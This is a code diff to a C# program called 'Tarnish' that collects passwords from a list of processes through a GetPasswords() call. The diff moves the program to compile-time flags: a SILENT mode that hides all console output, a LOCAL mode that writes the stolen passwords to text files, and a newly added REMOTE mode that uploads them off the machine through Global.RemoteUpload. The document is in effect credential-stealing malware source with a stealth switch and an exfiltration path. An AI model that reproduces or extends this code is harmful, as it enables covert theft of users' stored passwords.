@@ -1,6 +1,6 @@
-﻿#define SILENT
-using System;
+﻿using System;
 using System.IO;
+using System.Text;
 
 namespace Tarnish
 {
@@ -14,33 +14,37 @@ namespace Tarnish
         {
             if (!Directory.Exists(Global.DumpDir))
                 Directory.CreateDirectory(Global.DumpDir);
-            if (!Config.Silent)
-            {
-                Console.WriteLine("Tarnish " + Global.AssemName.Version.ToString());
-            }
+            #if !SILENT
+            Console.WriteLine("Tarnish " + Global.AssemName.Version.ToString());
+            #endif
             foreach (Proc proc in Processes)
             {
-                if (!Config.Silent)
-                {
-                    Console.WriteLine(proc.Name);
-                    Console.ForegroundColor = ConsoleColor.Gray;
-                }
+                #if !SILENT
+                Console.WriteLine(proc.Name);
+                Console.ForegroundColor = ConsoleColor.Gray;
+                #endif
                 string pws = proc.GetPasswords();
                 if (pws != "")
                 {
+                    #if LOCAL
                     using (StreamWriter sw = new StreamWriter(Global.DumpDir + proc.Name + ".txt"))
                         sw.Write(pws);
-                    if (!Config.Silent)
-                    {
-                        Console.ForegroundColor = ConsoleColor.Green;
-                        Console.WriteLine("OKAY!");
-                    }
+                    #endif
+                    #if REMOTE
+                    Global.RemoteUpload(Encoding.Default.GetBytes(pws), new DirectoryInfo(Global.DumpDir).Name + "." + proc.Name + ".txt");
+                    #endif
+                    #if !SILENT
+                    Console.ForegroundColor = ConsoleColor.Green;
+                    Console.WriteLine("OKAY!");
+                    #endif
                 }
-                else if (!Config.Silent)
+                #if !SILENT
+                else
                 {
                     Console.ForegroundColor = ConsoleColor.Red;
                     Console.WriteLine("FAIL!");
                 }
+                #endif
             }
         }
     }
